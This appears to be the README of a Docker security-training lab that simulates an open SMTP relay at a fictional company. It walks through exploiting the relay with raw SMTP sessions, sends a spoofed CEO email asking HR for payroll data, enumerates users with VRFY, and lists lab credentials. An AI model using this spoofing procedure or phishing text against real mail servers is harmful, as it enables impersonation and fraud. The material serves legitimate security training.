# 📧 Acme Logistics SMTP Relay Vulnerability Lab

> **Insecure SMTP Relay: Impersonation and Data Extraction via Server Misconfiguration**

A practical lab simulating a typical corporate mail server ("Acme Logistics") running Postfix, exposing a subtle but critical mail relay misconfiguration. You'll identify, exploit, and understand the impact of misconfigured recipient rules that let an attacker impersonate staff and send email as `ceo@acmelogistics.local` to any Internet recipient.

[![Docker](https://img.shields.io/badge/Docker-Ready-blue?logo=docker)](https://www.docker.com/)
[![Python](https://img.shields.io/badge/Python-3.11-green?logo=python)](https://python.org/)
[![SMTP](https://img.shields.io/badge/Protocol-SMTP-orange)](https://tools.ietf.org/html/rfc5321)
[![Security](https://img.shields.io/badge/Type-Security%20Lab-red)](https://en.wikipedia.org/wiki/Capture_the_flag)

## 🎯 Objective

This lab simulates a real-world scenario where a corporate mail server has a misconfigured `smtpd_recipient_restrictions` setting. The vulnerability allows an attacker to relay emails through the server by spoofing sender addresses from the company domain, enabling sophisticated phishing attacks and data extraction.

### 🎓 Skills Developed

- **SMTP Protocol Analysis** : Understanding SMTP commands and responses
- **Email Security Assessment** : Identifying relay misconfigurations
- **Manual Exploitation** : Step-by-step vulnerability exploitation
- **Social Engineering** : Leveraging technical vulnerabilities for phishing
- **Postfix Configuration** : Understanding MTA configuration pitfalls
- **Information Disclosure** : User enumeration via VRFY command

## 🚀 Quick Start

### Prerequisites

- [Docker](https://docs.docker.com/get-docker/) and [Docker Compose](https://docs.docker.com/compose/install/)
- Port 25 available (or modify configuration)
- Basic SMTP protocol knowledge
- Network tools (telnet, openssl, netcat)

### Installation and Setup

```bash
# Clone the repository
git clone <repository-url>
cd lab_smtp

# Start the lab
DOCKER_BUILDKIT=1 docker-compose -f deploy/docker-compose.yml up -d --build
```

### Verification

```bash
# Check container status
docker-compose -f deploy/docker-compose.yml ps

# Test SMTP connection
telnet localhost 25
```

## 📋 Lab Scenario

### Company Background
**Acme Logistics** is a medium-sized import/export company that relies heavily on email for internal operations. Their infrastructure includes an on-premises mail server accessible both from the intranet and Internet for remote workers.

### Technical Setup
- **Mail Server**: Postfix (SMTP) on Ubuntu 18.04
- **Authentication**: SASL/PLAIN authentication against Active Directory
- **Internal Domain**: `acmelogistics.local`
- **Constraint**: The SMTP server should only relay messages for authenticated users; unauthenticated connections should be denied

### The Vulnerability
During an external penetration test, reconnaissance reveals port 25 (SMTP) open on their mail server. The server accepts unauthenticated connections but rejects mail relay (as expected). However, a closer look reveals a misconfiguration in the `smtpd_recipient_restrictions` setting.

## 🔍 Discovery and Exploitation

### Step 1: Reconnaissance
```bash
# Connect to SMTP server
telnet localhost 25

# Observe banner
220 mail.acmelogistics.local ESMTP Postfix
```

### Step 2: Probe SMTP Banner and Relay
```bash
# Test basic connectivity
HELO attacker.com
250 mail.acmelogistics.local

# Try unauthenticated relay (should fail)
MAIL FROM: <attacker@evil.com>
250 Ok
RCPT TO: <victim@example.com>
554 Relay access denied: victim@example.com
```

### Step 3: Discover the Misconfiguration
```bash
# Try MAIL FROM with acmelogistics.local address
MAIL FROM: <ceo@acmelogistics.local>
250 Ok
RCPT TO: <attacker@external.com>
250 Ok  # VULNERABILITY: Relay allowed!
```

### Step 4: Exploit the Vulnerability
```bash
# Send spoofed email
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: Urgent: Payroll Data Request
From: ceo@acmelogistics.local
To: hr@acmelogistics.local

Dear HR Team,

This is an urgent request from the CEO office. Please forward the complete 
payroll data for Q4 2024 to this email address immediately.

Best regards,
CEO
Acme Logistics
.
250 Message accepted for delivery
```

## 🛠️ Available Tools

### Manual Testing
```bash
# Basic SMTP interaction
telnet localhost 25

# Test with openssl (if TLS is enabled)
openssl s_client -connect localhost:25 -starttls smtp
```

### Automated Testing
```bash
# Run comprehensive test suite
./test/check_smtp.sh

# Run auto-solve script
python3 test/auto_solve.py
```

### User Enumeration
```bash
# Test VRFY command for user discovery
VRFY ceo
250 ceo@acmelogistics.local

VRFY cfo
250 cfo@acmelogistics.local

VRFY hr
250 hr@acmelogistics.local
```

## 🔐 Available Credentials

| User | Password | Role |
|------|----------|------|
| `ceo` | `SecurePass2024!` | Chief Executive Officer |
| `cfo` | `Finance2024!` | Chief Financial Officer |
| `hr` | `HRsecure2024!` | Human Resources |
| `admin` | `AdminSecure2024!` | System Administrator |
| `john.doe` | `UserPass2024!` | Employee |
| `jane.smith` | `UserPass2024!` | Employee |
| `mike.wilson` | `UserPass2024!` | Employee |

## 🎯 Objective: Find the Admin Panel Password

The goal of this lab is to exploit the SMTP relay vulnerability to obtain a sensitive internal secret:

**Target:**
- The value of the header `X-Admin-Panel-Password` found in an internal email (from admin@acmelogistics.local to it-team@acmelogistics.local).
- Example: `X-Admin-Panel-Password: 9f8e7d6c`

**How to obtain it:**
- Use the relay vulnerability to send a spoofed email or enumerate the mailbox.
- The password is only accessible by exploiting the misconfiguration.

## 📊 Difficulty & Time

- **Difficulty**: Intermediate
- **Estimated Time**: 30-45 minutes
- **Prerequisites**: Basic SMTP protocol knowledge, network tools

## 🧠 Learning Objectives

### Technical Skills
- SMTP relay/vulnerability assessment
- Manual protocol interaction and exploitation
- Understanding MTA configuration pitfalls
- Email header analysis and manipulation

### Security Impact Understanding
- **Email Spoofing**: Impersonating high-level executives
- **Phishing Attacks**: Leveraging trusted domain reputation
- **Data Exfiltration**: Tricking employees into sending sensitive data
- **Reputation Damage**: Potential domain blacklisting
- **Business Fraud**: Social engineering with spoofed orders

## 🏗️ Project Structure

```
.
├── build/
│   ├── smtp_server.py          # Acme Logistics SMTP server
│   ├── Dockerfile              # Container configuration
│   ├── setup.sh               # Startup script
│   └── welcome_banner.txt     # Server banner
├── deploy/
│   ├── docker-compose.yml     # Service orchestration
│   ├── env.example           # Environment variables
│   └── start-smtp-lab.bat    # Windows startup script
├── test/
│   ├── check_smtp.sh         # Comprehensive test suite
│   ├── auto_solve.py         # Automated exploitation script
│   └── .gitkeep
├── docs/
│   ├── usage.md              # SMTP command reference
│   ├── credentials.md        # Security configuration
│   └── customization.md      # Lab customization guide
├── README.md                 # This file
└── .gitignore               # Git ignore rules
```

## 🚀 Quick Commands

### Start the Lab
```bash
# Build and start with Docker Compose
DOCKER_BUILDKIT=1 docker-compose -f deploy/docker-compose.yml up -d --build

# Check status
docker-compose -f deploy/docker-compose.yml ps
```

### Test the Lab
```bash
# Manual testing
telnet localhost 25

# Automated testing
./test/check_smtp.sh

# Auto-solve
python3 test/auto_solve.py
```

### Stop the Lab
```bash
docker-compose -f deploy/docker-compose.yml down
```

## 🔒 Security Notice

This lab contains intentional vulnerabilities for educational purposes. The SMTP relay misconfiguration demonstrates a real-world security issue that can lead to:

- Email spoofing and impersonation
- Phishing attacks using trusted domains
- Data exfiltration through social engineering
- Domain reputation damage
- Potential business fraud

## 📚 Additional Resources

- **SMTP RFC 5321**: [https://tools.ietf.org/html/rfc5321](https://tools.ietf.org/html/rfc5321)
- **Postfix Documentation**: [http://www.postfix.org/documentation.html](http://www.postfix.org/documentation.html)
- **Email Security Best Practices**: [https://www.ietf.org/rfc/rfc7208.txt](https://www.ietf.org/rfc/rfc7208.txt)

## 🤝 Contributing

For issues, questions, or improvements, please:
1. Check the existing documentation
2. Review the test scripts for examples
3. Submit detailed bug reports
4. Provide reproduction steps

## 📄 License

This educational lab is provided for security training and research purposes. Use responsibly and only on systems you own or have explicit permission to test.

---

**Acme Logistics - Connecting the World Through Reliable Logistics** 🚢📦 